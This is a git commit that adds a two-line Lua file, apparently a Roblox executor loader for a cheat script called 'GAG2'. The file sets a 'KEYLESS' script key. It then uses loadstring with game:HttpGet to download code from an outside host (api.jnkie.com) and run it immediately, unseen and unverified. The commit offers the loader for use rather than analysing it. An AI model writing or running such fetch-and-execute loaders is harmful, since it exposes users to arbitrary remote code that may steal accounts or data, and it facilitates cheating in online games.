08f5f753c1f5e75cc926233c6900f8a7e82fecc4
Somerandomidiot <90102713+Somerandomidiot@users.noreply.github.com>
2026-06-22 12:42:05 +0545

    Add UI_FREE.lua with script loading functionality

---
+++ GAG2/UI_FREE.lua
@@ -0,0 +1,2 @@
+getgenv().SCRIPT_KEY = "KEYLESS"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/bda9fc8956f2d07e60b36d6d7c772bc23456c51ce3faad3e9fb9af07c5b6a0d8/download"))()
